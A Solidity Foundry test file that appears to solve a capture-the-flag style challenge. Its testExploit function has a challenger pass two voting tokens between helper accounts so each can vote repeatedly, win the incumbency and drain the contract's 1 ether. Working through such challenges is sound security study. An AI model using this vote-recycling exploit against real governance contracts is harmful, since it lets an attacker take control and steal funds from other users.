// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Democracy} from "../src/Democracy.sol";

contract DemocracyTest is Test {
    Democracy public victimContract;
    address public challenger;
    address public alice;
    address public bob;

    function setUp() public {
        challenger = makeAddr("challenger");
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        uint256 value = 1 ether;
        victimContract = new Democracy{value: value}();
    }

    function testExploit() public {
        vm.startPrank(challenger, challenger);
        victimContract.nominateChallenger(challenger);
        vm.stopPrank();

        uint256 tokenId0 = 0;
        uint256 tokenId1 = 1;

        console.log("CHALLENGER", address(challenger));

        assertEq(victimContract.ownerOf(tokenId0), challenger);
        assertEq(victimContract.ownerOf(tokenId1), challenger);

        vm.startPrank(challenger, challenger);
        victimContract.approve(alice, tokenId0);
        victimContract.approve(bob, tokenId1);
        victimContract.transferFrom(challenger, alice, tokenId0);
        victimContract.transferFrom(challenger, bob, tokenId1);
        vm.stopPrank();

        assertEq(victimContract.ownerOf(tokenId0), alice);
        assertEq(victimContract.ownerOf(tokenId1), bob);

        vm.startPrank(alice, alice);
        victimContract.vote(challenger);
        victimContract.approve(bob, tokenId0);
        victimContract.transferFrom(alice, bob, tokenId0);
        payable(challenger).call{value: address(alice).balance}("");
        vm.stopPrank();

        assertEq(address(alice).balance, 0, "Alice balance should be zero");
        assertEq(victimContract.ownerOf(tokenId0), bob);
        assertEq(victimContract.ownerOf(tokenId1), bob);

        vm.startPrank(bob, bob);
        victimContract.vote(challenger);
        victimContract.approve(challenger, tokenId0);
        victimContract.approve(challenger, tokenId1);
        victimContract.transferFrom(bob, challenger, tokenId0);
        victimContract.transferFrom(bob, challenger, tokenId1);
        payable(challenger).call{value: address(bob).balance}("");
        vm.stopPrank();

        assertEq(address(bob).balance, 0, "Alice balance should be zero");
        assertEq(victimContract.ownerOf(tokenId0), challenger);
        assertEq(victimContract.ownerOf(tokenId1), challenger);

        assertEq(victimContract.incumbent(), challenger);

        vm.startPrank(challenger, challenger);
        victimContract.withdrawToAddress(challenger);
        vm.stopPrank();

        assertEq(address(victimContract).balance, 0, "Contract balance should be zero");
        assertEq(address(challenger).balance, 1 ether, "Challenger balance should be 1 ether");
    }
}
